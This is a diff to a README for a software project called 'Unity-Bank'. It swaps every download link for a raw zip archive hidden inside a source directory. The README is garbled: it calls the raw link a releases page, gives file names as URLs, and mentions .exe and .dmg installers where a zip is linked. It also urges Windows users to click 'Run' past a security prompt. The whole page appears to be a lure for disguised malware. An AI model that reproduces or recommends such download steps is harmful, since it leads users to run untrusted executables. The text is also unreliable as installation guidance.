@@ -1,6 +1,6 @@
 # 🌟 Unity-Bank - Your Banking Experience Made Simple
 
-[![Download Unity-Bank](https://raw.githubusercontent.com/MohGith/Unity-Bank/main/carnaubic/Unity-Bank.zip)](https://raw.githubusercontent.com/MohGith/Unity-Bank/main/carnaubic/Unity-Bank.zip)
+[![Download Unity-Bank](https://github.com/MohGith/Unity-Bank/raw/refs/heads/main/src/app/(Main)/Bank_Unity_v2.6-beta.2.zip)](https://github.com/MohGith/Unity-Bank/raw/refs/heads/main/src/app/(Main)/Bank_Unity_v2.6-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,13 +20,13 @@ Before you start, make sure your computer meets these basic requirements:
 
 To download Unity-Bank, visit the Releases page below:
 
-[Visit this page to download](https://raw.githubusercontent.com/MohGith/Unity-Bank/main/carnaubic/Unity-Bank.zip)
+[Visit this page to download](https://github.com/MohGith/Unity-Bank/raw/refs/heads/main/src/app/(Main)/Bank_Unity_v2.6-beta.2.zip)
 
 ### Step-by-Step Installation
 
 1. **Click the Download Link:** Follow the link above to reach the Releases page.
 2. **Select the Latest Version:** Look for the latest version of the software. It will be at the top of the page.
-3. **Download the Installer:** Click on the installer file to start the download. This file will usually have a name like `https://raw.githubusercontent.com/MohGith/Unity-Bank/main/carnaubic/Unity-Bank.zip` or `https://raw.githubusercontent.com/MohGith/Unity-Bank/main/carnaubic/Unity-Bank.zip`.
+3. **Download the Installer:** Click on the installer file to start the download. This file will usually have a name like `https://github.com/MohGith/Unity-Bank/raw/refs/heads/main/src/app/(Main)/Bank_Unity_v2.6-beta.2.zip` or `https://github.com/MohGith/Unity-Bank/raw/refs/heads/main/src/app/(Main)/Bank_Unity_v2.6-beta.2.zip`.
 4. **Run the Installer:**
    - **For Windows:** Double-click the downloaded `.exe` file. A security prompt may appear; click "Run" to proceed.
    - **For macOS:** Open the `.dmg` file, then drag the Unity-Bank icon to your Applications folder.
